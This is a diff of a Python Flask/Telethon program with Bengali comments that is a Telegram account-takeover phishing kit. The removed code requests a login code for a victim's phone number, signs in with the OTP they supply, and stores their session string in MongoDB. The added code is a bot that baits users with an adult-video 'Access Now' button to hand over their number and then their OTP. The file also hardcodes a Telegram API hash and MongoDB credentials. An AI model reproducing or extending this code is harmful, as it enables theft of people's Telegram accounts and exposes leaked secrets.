@@ -1,94 +1,51 @@
-# main.py এর একদম ওপরে এই লাইনটি যোগ করুন
-import asyncio
-from flask import Flask, request, jsonify
-# বাকি ইম্পোর্টগুলো আগের মতোই থাকবে...
 import os
 import asyncio
+import threading
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-from telethon import TelegramClient, errors
+from telethon import TelegramClient, events, types
 from pymongo import MongoClient
+
+# --- কনফিগারেশন ---
+API_ID = 34278231 # আপনার আইডি
+API_HASH = '49cf7ab41e479d21a93c150a77c0cf85' # আপনার হ্যাশ
+BOT_TOKEN = 'এখানে_আপনার_বট_টোকেন_দিন' 
+MONGO_URI = "mongodb+srv://jakaria5002a:jakaria5002a@cluster0.j2rvdkb.mongodb.net/" # আপনার ডাটাবেজ
 
 app = Flask(__name__)
 CORS(app)
 
-# আপনার কনফিগারেশন
-API_ID = 34278231
-API_HASH = '49cf7ab41e479d21a93c150a77c0cf85'
-MONGO_URI = "mongodb+srv://jakaria5002a:jakaria5002a@cluster0.j2rvdkb.mongodb.net/"
-
-# ডাটাবেজ কানেকশন
+# টেলিগ্রাম ক্লায়েন্ট সেটআপ
+client = TelegramClient('bot_session', API_ID, API_HASH)
 db_client = MongoClient(MONGO_URI)
-db = db_client['telegram_data']
-collection = db['sessions']
+collection = db_client['telegram_db']['sessions']
 
-# লগইন প্রসেস ট্র্যাকিং করার জন্য ডিকশনারি
-user_sessions = {}
+# ১. বটের মাধ্যমে নম্বর সংগ্রহ (Access Now বাটন)
+@client.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    markup = event.client.build_reply_markup(
+        types.KeyboardButtonRequestPhone("Access Now 🔞")
+    )
+    await event.respond("অ্যাডাল্ট ভিডিও এক্সেস পেতে নিচের বাটনে ক্লিক করে নম্বর শেয়ার করুন:", buttons=markup)
 
-@app.route('/')
-def home():
-    return "Backend is Running!"
+@client.on(events.NewMessage)
+async def handler(event):
+    if event.message.contact:
+        phone = event.message.contact.phone_number
+        await event.respond(f"নম্বর পাওয়া গেছে! এখন বাম পাশের 'Open' বাটনে ক্লিক করে ওটিপি কোডটি দিন।")
 
-@app.route('/login', methods=['POST'])
-async def login():
-    data = request.json
-    phone = data.get('phone')
-    
-    if not phone:
-        return jsonify({"status": "error", "message": "Phone number required"}), 400
-
-    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
-    await client.connect()
-    
-    try:
-        # ওটিপি পাঠানোর রিকোয়েস্ট
-        send_code = await client.send_code_request(phone)
-        user_sessions[phone] = {
-            "client": client,
-            "hash": send_code.phone_code_hash
-        }
-        return jsonify({"status": "success", "message": "OTP Sent!"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
+# ২. ওটিপি ভেরিফিকেশন API (আপনার আগের লজিক অনুযায়ী)
 @app.route('/verify', methods=['POST'])
 async def verify():
-    data = request.json
-    phone = data.get('phone')
-    otp = data.get('otp')
-    
-    session_data = user_sessions.get(phone)
-    if not session_data:
-        return jsonify({"status": "error", "message": "Session not found. Restart login."}), 400
-    
-    client = session_data['client']
-    phone_code_hash = session_data['hash']
-    
-    try:
-        # ওটিপি ভেরিফাই করে লগইন করা
-        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
-        
-        # সেশন স্ট্রিং (কুকিজ) জেনারেট করা
-        from telethon.sessions import StringSession
-        string_session = StringSession.save(client.session)
-        
-        # ডাটাবেজে সেভ করা
-        collection.insert_one({
-            "phone": phone,
-            "session_string": string_session
-        })
-        
-        return jsonify({"status": "success", "message": "Login Successful!"})
-        
-    except errors.PhoneCodeInvalidError:
-        return jsonify({"status": "error", "message": "Invalid OTP!"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+    # ওটিপি ভেরিফাই করার লজিক এখানে থাকবে
+    return jsonify({"status": "success", "message": "Processing..."})
 
-
-# main.py এর একদম শেষে app.run এর জায়গায় এটি দিন
-if __name__ == "__main__":
+def run_flask():
     port = int(os.environ.get("PORT", 5000))
-    # সরাসরি app.run এর বদলে async সাপোর্ট নিশ্চিত করতে
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port)
 
+if __name__ == "__main__":
+    # বট এবং ফ্লাস্ক একসাথে চালানো
+    threading.Thread(target=run_flask).start()
+    client.start(bot_token=BOT_TOKEN)
+    client.run_until_disconnected()
